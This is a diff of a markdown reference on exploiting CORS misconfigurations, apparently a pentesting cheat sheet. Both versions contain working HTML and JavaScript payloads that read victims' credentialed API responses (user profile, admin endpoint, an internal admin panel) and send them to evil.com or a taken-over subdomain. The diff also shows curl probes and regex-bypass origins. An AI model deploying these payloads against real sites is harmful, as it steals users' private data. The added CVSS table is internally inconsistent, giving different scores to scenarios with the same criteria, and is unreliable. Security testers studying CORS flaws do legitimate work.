@@ -1,91 +1,78 @@
-# CORS Misconfiguration Exploitation
+# CORS Misconfiguration: Complete Reference
 
 ## Detection
 
+### Origin Reflection
 ```bash
-# Test basic reflection
-curl -sI -H "Origin: https://evil.com" https://target.com/api/auth | grep -i access-control
-
-# Test null origin
-curl -sI -H "Origin: null" https://target.com/api/auth | grep -i access-control
-
-# Test subdomain patterns
-curl -sI -H "Origin: https://evil.target.com" https://target.com/api
-curl -sI -H "Origin: https://target.computer" https://target.com/api
+# If the server reflects back any origin
+curl -H "Origin: https://evil.com" https://target.com/api/sensitive
+# Response:
+# Access-Control-Allow-Origin: https://evil.com
+# Access-Control-Allow-Credentials: true
 ```
 
-## Exploitation Scenarios
+### Null Origin
+```bash
+# Some servers trust null origin
+curl -H "Origin: null" https://target.com/api/user
+curl -H "Origin: file://" https://target.com/api/user
 
-### Reflected Origin with Credentials
-```http
-Access-Control-Allow-Origin: https://evil.com
+# Sandboxed iframe can send null origin requests
+<iframe sandbox="allow-scripts" src="https://target.com/api/user"></iframe>
+```
+
+### Wildcard with Credentials
+```bash
+# If Access-Control-Allow-Credentials is set with wildcard origin
+Access-Control-Allow-Origin: *
 Access-Control-Allow-Credentials: true
+# This SHOULD fail per spec, but some implementations allow it
 ```
-```html
-<!-- Host on evil.com, victim visits -->
-<script>
-fetch('https://target.com/api/user/private', {credentials: 'include'})
-  .then(r => r.text())
-  .then(d => new Image().src = 'https://evil.com/log?data='+encodeURIComponent(d));
-</script>
-```
-
-### Null Origin Exploit
-```http
-Access-Control-Allow-Origin: null
-Access-Control-Allow-Credentials: true
-```
-```html
-<iframe sandbox="allow-scripts" srcdoc="
-  <script>
-    fetch('https://target.com/api/user/profile', {credentials:'include'})
-      .then(r => r.text())
-      .then(d => new Image().src='https://evil.com/?data='+btoa(d));
-  </script>
-"></iframe>
-```
-
-### Regex Bypass
-```python
-# Server validates: origin matches ^https?://(.*\.)?target\.com$
-# Bypass via:
-https://target.com.evil.com
-https://target.computer  # . matches any char
-https://target.com%40evil.com  # @ confusion
-https://target.com\.evil.com  # Safari alternative parser
-```
-
-### Wildcard Subdomain Trust
-```http
-Access-Control-Allow-Origin: https://*.target.com
-```
-Requires finding XSS on any subdomain → pivot to main domain via CORS.
 
 ### Preflight Bypass
-```http
-# Non-simple requests require OPTIONS preflight
-# But some servers allow CORS on preflight but not actual request
-# Test: include custom header that triggers preflight
-Origin: https://evil.com
-Access-Control-Request-Method: PUT
-# If preflight allows but actual request rejects, not exploitable
+```bash
+# Some endpoints skip preflight for simple requests (GET, POST with URL-encoded)
+# They still include CORS headers in response
+curl -X GET -H "Origin: https://evil.com" https://target.com/api/user
 ```
 
-## Internal Network Pivoting via CORS
+## Exploitation
 
-When internal apps have permissive CORS:
+### Dynamic Origin Reflection
 ```html
+<html>
+<body>
 <script>
-// Read response from internal service via victim's browser
-fetch('http://internal.admin-panel/').then(r => r.text()).then(d => { new Image().src='https://evil.com/log?data='+encodeURIComponent(d); });
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://target.com/api/user', true);
+xhr.withCredentials = true;
+xhr.onload = function() {
+  fetch('https://evil.com/steal?data=' + encodeURIComponent(btoa(xhr.responseText)));
+};
+xhr.send();
+</script>
+</body>
+</html>
+```
+
+### Subdomain Takeover Based
+```html
+<!-- If target trusts subdomains -->
+<!-- Takeover a subdomain first, then exploit CORS from there -->
+<script>
+var xhr = new XMLHttpRequest();
+xhr.open('GET', 'https://target.com/api/admin', true);
+xhr.withCredentials = true;
+xhr.onload = function() {
+  fetch('https://taken-subdomain.com/steal?data=' + btoa(xhr.responseText));
+};
+xhr.send();
 </script>
 ```
 
-## Remediation Verification
-
-```bash
-# After fix, verify:
-curl -s -H "Origin: https://evil.com" -I https://target.com/api
-# Should NOT have Access-Control-Allow-Origin header at all
-# OR should have Access-Control-Allow-Origin: https://exact-origin.com
-```
+## CVSS Scoring
+| Scenario | CVSS | Criteria |
+|----------|------|---------|
+| CORS reflection -> data theft | 6.1 | Network, Low, User interaction required |
+| CORS null origin -> sandboxed iframe steal | 8.1 | Network, Low, User interaction required |
+| CORS wildcard with credentials | 7.5 | Network, Low, No auth |
